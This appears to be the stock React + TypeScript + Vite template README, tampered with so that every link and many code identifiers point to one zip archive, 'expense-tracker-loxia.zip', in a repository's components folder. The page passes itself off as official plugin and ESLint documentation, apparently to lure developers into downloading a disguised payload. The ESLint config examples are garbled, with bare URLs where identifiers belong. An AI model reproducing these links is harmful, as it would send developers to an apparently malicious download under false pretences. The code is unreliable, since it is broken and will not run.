# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) uses [Babel](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) (or [oxc](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) uses [SWC](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip and replace with this
      https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip,
      // Alternatively, use this for stricter rules
      https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip,
      // Optionally, add this for stylistic rules
      https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip', 'https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip'],
        tsconfigRootDir: https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip) for React-specific lint rules:

```js
// https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip', 'https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip'],
        tsconfigRootDir: https://raw.githubusercontent.com/KindaJayant/expense-tracker/main/src/components/expense-tracker-loxia.zip,
      },
      // other options...
    },
  },
])
```
